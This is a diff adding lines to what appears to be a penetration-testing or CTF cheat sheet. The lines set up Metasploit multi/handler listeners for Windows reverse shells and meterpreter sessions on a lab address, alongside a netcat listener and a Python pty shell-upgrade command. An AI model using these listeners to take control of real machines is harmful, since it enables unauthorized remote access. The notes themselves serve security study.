@@ -212,6 +212,20 @@ on local machine
 netcat -lvnp 1234
 ```
 
+listen for normal shell
+```
+use exploit/multi/handler
+set payload windows/shell/reverse_tcp
+set lhost 10.4.9.144
+set lport 4443
+run -j
+```
+
+listen for meterpreter shell
+```
+use exploit/multi/handler set PAYLOAD windows/meterpreter/reverse_tcp set LHOST 10.4.9.144 set LPORT 1234 run
+```
+
 upgrade shell
 ```
 python -c "import pty; pty.spawn('/bin/bash')"
